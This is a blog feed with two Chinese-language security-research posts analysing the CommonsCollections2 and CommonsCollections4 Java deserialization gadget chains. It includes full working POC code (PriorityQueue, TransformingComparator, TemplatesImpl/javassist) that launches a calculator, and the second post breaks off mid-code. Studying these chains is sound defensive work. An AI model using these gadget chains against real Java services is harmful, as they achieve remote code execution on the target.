    
    
    <entry>
      <title>CommonsCollections2利用链分析</title>
      <link href="/2022/11/10/CommonsCollections2/"/>
      <url>/2022/11/10/CommonsCollections2/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections2利用链分析"><a href="#CommonsCollections2利用链分析" class="headerlink" title="CommonsCollections2利用链分析"></a>CommonsCollections2利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections2</code>利用链利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure><p>可以看到，在 cc2 是针对<code>CommonsCollections 4.0</code>新版本的利用链，环境配置 Maven 依赖如下（需要 javassist 的原因在下文）：<br><img src="images/image-20221009105637369.png" alt="image-20221009105637369"></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>我们就跟着链子逐步探究一番。</p><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>看<code>PriorityQueue#readObject()</code>方法源码<br><img src="images/image-20221009112426049.png" alt="image-20221009112426049"></p><p>可以看到对传入的对象输入流<code>s</code>进行反序列化并传入到<code>queue</code>数组中，说明<code>s</code>是经过序列化后的数据，那么接着看<code>writeObject()</code>序列化方法<br><img src="images/image-20221009112818375.png" alt="image-20221009112818375"></p><p>其中对<code>queue</code>数组遍历进行序列化，而<code>queue</code>是<code>PriorityQueue</code>类的一个属性，那么我们可以通过反射进行控制，所以<code>queue</code>成为可控点。<br><img src="images/image-20221009112947079.png" alt="image-20221009112947079"></p><p>前面可以看到<code>readObject()</code>方法最后还调用了<code>heapify()</code>方法，我们接着跟<code>heapify()</code><br><img src="images/image-20221009113211379.png" alt="image-20221009113211379"></p><p><code>headify()</code>方法进行循环并调用了<code>siftDown()</code>方法，其中第二个参数<code>queue</code>是可控点，继续跟进<code>siftDown()</code>源码<br><img src="images/image-20221009113328581.png" alt="image-20221009113328581"></p><p>这里做了一个判断，如果<code>comparator</code>不为空，则进入<code>siftDownUsingComparator(k, x)</code>方法。<br><img src="images/image-20221009113434631.png" alt="image-20221009113434631"></p><p>这里<code>comparator</code>也是<code>PriorityQueue</code>类的一个属性，因此也可以通过反射进行控制。此外，因为前面的<code>queue</code>是可控的，所以这里<code>siftDownUsingComparator(k, x)</code>的<code>x</code>也是可控的。</p><p>继续跟进<code>siftDownUsingComparator()</code>方法源码<br><img src="images/image-20221009113836865.png" alt="image-20221009113836865"></p><p>可以看到这里调用到了<code>comparator.compare()</code>方法，而<code>comparator</code>是可控的，并且<code>comparator(x,c)</code>中的<code>x</code>也是可控的。</p><p>根据利用链可以看到<code>comparator</code>被赋值为<code>TransformingComparator</code>，接下来到了<code>TransformingComparator.compare()</code>方法。</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><p>跟进<code>TransformingComparator#compare()</code>方法<br><img src="images/image-20221009120104239.png" alt="image-20221009120104239"></p><p>可以看到会执行<code>this.transformer.transform()</code>方法，并且<code>this.transformer</code>在前面构造参数方法的时候进行赋值，因此也是可控点。这里可以根据前面学习的<code>CommonsCollections1</code>开始构造 POC 了。</p><p>在构造 POC 前，发现<code>ysoserial</code>中的<code>queue</code>添加了两个元素<br><img src="images/image-20221009121010160.png" alt="image-20221009121010160"></p><p>这是为啥捏？回去重新跟一下，发现原来是要满足在<code>heapify()</code>方法的操作，如果只有一个元素则<code>size</code>为 1，最后经过无符号右移动 1 位并且减 1 ，则结果为 -1 将无法进入<code>siftDown()</code>方法<br><img src="images/image-20221009121552839.png" alt="image-20221009121552839"></p><p>补充一下，<code>TransformingComparator</code>类只有在<code>CommonsCollections4.0</code>的时候才实现<code>serializable</code>接口，因此才可以进行序列化与反序列化。<br><img src="images/image-20221012154454936.png" alt="image-20221012154454936"></p><p>这也是为什么<code>CommonsCollections2</code>限制了利用版本在<code>CommonsCollections4.0</code>的原因。</p><h2 id="构造-POC"><a href="#构造-POC" class="headerlink" title="构造 POC"></a>构造 POC</h2><p>根据以上学习，利用链已经清晰明了，构造 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ysoserial中的利用链"><a href="#ysoserial中的利用链" class="headerlink" title="ysoserial中的利用链"></a>ysoserial中的利用链</h2><p>在<code>ysoserial</code>中的利用链则和前面我们所构造的有所不同，gadget 如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>与我们前面构造的 POC 不同的是，<code>ysoserial</code>后面采用了<code>TemplatesImpl</code>类，我们跟进<code>TemplatesImpl#newTransformer()</code>方法<br><img src="images/image-20221010113159001.png" alt="image-20221010113159001"></p><p>该方法中调用了<code>getTransletInstance()</code>，继续跟进<code>getTransletInstance()</code>源码<br><img src="images/image-20221010113437251.png" alt="image-20221010113437251"></p><p>上面可以看到当<code>this._class</code>为<code>null</code>时就会调用<code>defineTransletClasses()</code>方法，因为<code>this._class</code>为<code>TemplatesImpl</code>类的属性，所以是可以通过反射控制的。</p><p>继续跟进<code>defineTransletClasses()</code>方法<br><img src="images/image-20221010113526585.png" alt="image-20221010113526585"></p><p>这里通过<code>load.defineClass()</code>方法将字节码进行加载定义一个新的类，而<code>this._bytecodes</code>也是类的属性，所以也是可以通过反射进行控制字节码。此外，接下来的<code>superClass.getName().equals(ABSTRACT_TRANSLET)</code>判断新定义的类是否继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类，只有继承才会将下标<code>i</code>赋值给<code>this._transletIndex</code>。</p><p>最后再通过<code>newInstance()</code>方法实例化新定义的类<br><img src="images/image-20221010114142369.png" alt="image-20221010114142369"></p><p>构造 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造InvokerTransformer</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(invokerTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射修改queue</span></span><br><span class="line">        Object[] objectsArrary = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue,objectsArrary);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221010161316401.png" alt="image-20221010161316401"></p><p><strong>这里为什么需要再通过一次反射修改 queue ？</strong> </p><p>可以往回到<code>compara()</code>方法，因为我们这次使用的是<code>InvokerTransformer</code>，其中的<code>transform()</code>参数<code>obj1</code>需要设置为<code>TemplatesImpl</code>类，去触发<code>TemplatesImpl#newTransformer()</code><br><img src="images/image-20221010162150110.png" alt="image-20221010162150110"></p><p>那为什么不在第一个<code>priorityQueue.add(1)</code>时加入呢？因为在后面会有一个数组间的元素比较，而对象和数字，以及对象和对象是无法比较的。</p><p>接下来回答一下开头说的为什么<code>javassist</code>是个伪条件，跟下来其实发现<code>javassist</code>的作用就是构造一个恶意类，最后这个恶意类被转换成了字节码。而我们可以本地构造好恶意类的字节码，直接设置到<code>_bytecodes</code>，无需在目标主机上去通过<code>javassist</code>构造。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections4利用链分析</title>
      <link href="/2022/11/10/CommonsCollections4/"/>
      <url>/2022/11/10/CommonsCollections4/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections4利用链分析"><a href="#CommonsCollections4利用链分析" class="headerlink" title="CommonsCollections4利用链分析"></a>CommonsCollections4利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续来看<code>CommonsCollections4</code>的链子，在<code>ysoserial</code>里的注释说明是在<code>CommonsCollections2</code>的基础上，使用<code>InstantiateTransformer</code>类替代<code>InvokerTransformer</code>类<br><img src="images/image-20221011105116866.png" alt="image-20221011105116866"></p><p>因此利用链为：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>环境和<code>CommonsCollections2</code>一样<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>其实到这里已经没有什么好分析的了，就是把<code>CommonsCollections2</code>中的<code>InvokerTransformer</code>替换成<code>CommonsCollections3</code>中学习到的<code>InstantiateTransformer</code>，所有知识都是前面分析过的，这里就不再赘述了，可以直接写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 